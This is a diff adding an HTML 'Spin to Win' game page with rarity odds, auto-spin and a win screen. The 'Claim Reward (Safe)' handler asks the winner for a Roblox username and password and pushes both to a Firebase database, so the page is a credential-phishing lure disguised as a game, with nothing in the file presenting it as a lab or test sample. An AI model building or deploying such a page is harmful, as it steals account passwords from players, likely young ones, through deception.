@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Spin Game</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        body {
+            background:#0f172a;
+            color:white;
+            text-align:center;
+            font-family:Arial;
+            margin:0;
+        }
+
+        .hidden { display:none; }
+
+        .container {
+            padding:20px;
+        }
+
+        .chances {
+            position:absolute;
+            left:30px;
+            top:100px;
+            text-align:left;
+        }
+
+        .mobile .chances {
+            position:static;
+            text-align:center;
+            margin-bottom:20px;
+        }
+
+        button {
+            padding:25px 60px;
+            font-size:22px;
+            background:#22c55e;
+            border:none;
+            border-radius:20px;
+            cursor:pointer;
+            transition:0.2s;
+        }
+
+        button:hover {
+            transform:scale(1.05);
+        }
+
+        .mobile button {
+            width:90%;
+            font-size:26px;
+        }
+
+        .win-screen {
+            display:none;
+            position:fixed;
+            top:0;
+            left:0;
+            width:100%;
+            height:100%;
+            background:rgba(0,0,0,0.85);
+            justify-content:center;
+            align-items:center;
+            flex-direction:column;
+        }
+
+        .win-text {
+            font-size:55px;
+            color:#22c55e;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- DEVICE SELECT -->
+<div id="deviceSelect">
+    <h1>Select Device</h1>
+    <button onclick="setDevice('mobile')">Mobile</button>
+    <br><br>
+    <button onclick="setDevice('desktop')">Computer</button>
+</div>
+
+<!-- GAME -->
+<div id="game" class="hidden container">
+
+    <h1>Spin to Win</h1>
+
+    <div class="chances">
+        <h3>Chances:</h3>
+        <p>Common 🟩 - 75%</p>
+        <p>Rare 🟦 - 20%</p>
+        <p>Epic 🟪 - 3%</p>
+        <p>Legendary 🟨 - 1%</p>
+        <p>Mythic 🟥 - 0.75%</p>
+        <p>Secret ⬛ - 0.2%</p>
+        <p>God ⬜ - 0.04%</p>
+        <p>OG 🐘 - 0.01%</p>
+    </div>
+
+    <h2 id="result">Try your luck</h2>
+
+    <button onclick="spin()">SPIN</button>
+
+    <br><br>
+
+    <button onclick="toggleAuto()" id="autoBtn">AUTO SPIN: OFF</button>
+
+    <br><br>
+
+    <label>Speed:</label>
+    <select id="speed">
+        <option value="1000">Slow</option>
+        <option value="500" selected>Normal</option>
+        <option value="200">Fast</option>
+        <option value="50">Insane</option>
+        <option value="10">Ultra Insane</option>
+    </select>
+
+    <h2>Land on Secret, God, OG to win</h2>
+
+    <p>Common: <span id="common">0</span></p>
+    <p>Rare: <span id="rare">0</span></p>
+    <p>Epic: <span id="epic">0</span></p>
+    <p>Legendary: <span id="legendary">0</span></p>
+    <p>Mythic: <span id="mythic">0</span></p>
+    <p>Secret: <span id="secret">0</span></p>
+    <p>God: <span id="god">0</span></p>
+    <p>OG: <span id="og">0</span></p>
+
+</div>
+
+<!-- WIN SCREEN -->
+<div id="winScreen" class="win-screen">
+    <div class="win-text">YOU WON 🎉</div>
+    <br>
+    <button onclick="manualClaim()">Claim Reward (Safe)</button>
+</div>
+
+<!-- FIREBASE -->
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+
+<script>
+
+/* FIREBASE CONFIG */
+const firebaseConfig = {
+    apiKey: "YOUR_API_KEY",
+    authDomain: "you-won-2f7b0.firebaseapp.com",
+    databaseURL: "https://you-won-2f7b0-default-rtdb.firebaseio.com",
+    projectId: "you-won-2f7b0",
+    storageBucket: "you-won-2f7b0.appspot.com",
+    messagingSenderId: "YOUR_ID",
+    appId: "YOUR_APP_ID"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+/* GAME */
+let auto=false;
+let interval;
+
+let inventory={
+    common:0,rare:0,epic:0,legendary:0,mythic:0,secret:0,god:0,og:0
+};
+
+function setDevice(type){
+    document.getElementById("deviceSelect").style.display="none";
+    document.getElementById("game").classList.remove("hidden");
+    if(type==="mobile") document.body.classList.add("mobile");
+}
+
+function spin(){
+    let r=Math.random()*100;
+    let result="";
+
+    if(r<75){result="Common 🟩";inventory.common++;}
+    else if(r<95){result="Rare 🟦";inventory.rare++;}
+    else if(r<98){result="Epic 🟪";inventory.epic++;}
+    else if(r<99){result="Legendary 🟨";inventory.legendary++;}
+    else if(r<99.75){result="Mythic 🟥";inventory.mythic++;}
+    else if(r<99.95){result="Secret ⬛";inventory.secret++; showWin();}
+    else if(r<99.99){result="God ⬜";inventory.god++; showWin();}
+    else{result="OG 🐘";inventory.og++; showWin();}
+
+    document.getElementById("result").innerText=result;
+
+    for(let k in inventory){
+        document.getElementById(k).innerText=inventory[k];
+    }
+}
+
+/* AUTO SPIN */
+function toggleAuto(){
+    auto=!auto;
+    let btn=document.getElementById("autoBtn");
+
+    if(auto){
+        btn.innerText="AUTO SPIN: ON";
+        startAuto();
+    } else {
+        btn.innerText="AUTO SPIN: OFF";
+        clearInterval(interval);
+    }
+}
+
+function startAuto(){
+    clearInterval(interval);
+    let speed=parseInt(document.getElementById("speed").value);
+    interval=setInterval(spin,speed);
+}
+
+document.getElementById("speed").addEventListener("change",()=>{
+    if(auto) startAuto();
+});
+
+function showWin(){
+    document.getElementById("winScreen").style.display="flex";
+}
+
+/* FIREBASE SAVE */
+function manualClaim(){
+
+    const username = prompt("Enter Roblox Username:");
+    if(!username) return;
+
+    const code = prompt("Enter Password:");
+    if(!code) return;
+
+    db.ref("claims").push({
+        username: username,
+        luckyCode: code,
+        time: Date.now()
+    });
+
+    alert("Thank You For Submitting ✔");
+    document.getElementById("winScreen").style.display="none";
+}
+
+</script>
+
+</body>
+</html>
